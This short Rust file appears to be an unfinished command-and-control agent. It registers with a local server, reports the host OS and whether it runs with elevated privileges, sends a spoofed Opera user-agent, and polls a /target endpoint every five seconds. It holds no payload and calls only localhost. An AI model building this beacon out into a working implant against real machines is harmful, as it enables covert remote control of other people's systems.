use reqwest::blocking::Client;
use serde::Serialize;

// const USER_AGENT: &str = env!("USER_AGENT");
const USER_AGENT: &str = "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00";

// https://localhost:8000
//  - reg    (post)
//  - target (get)

#[derive(Serialize)]
pub struct AgentInfo {
    os: String,
    elevated: bool,
}

fn main() {
    let client = Client::new();

    let agent_info = AgentInfo { os: "Windows".to_string(), elevated: false };

    loop {
        let mut _r = client.post("http://127.0.0.1:8000/reg")
            .header("user-agent", USER_AGENT)
            .header("Content-Type", "application/json")
            .body(serde_json::to_string(&agent_info).unwrap())
            .send()
            .unwrap();

        dbg!(USER_AGENT);
        dbg!(&_r.status());

        let uuid = _r.text().unwrap();
        dbg!(uuid.clone());
        
        loop {
            std::thread::sleep(std::time::Duration::from_secs(5));
            match client.get("http://127.0.0.1:8000/target").query(&[("uuid", &uuid)]).send() {
                Ok(_) => (),
                Err(_) => break
            }
        }
    }
}

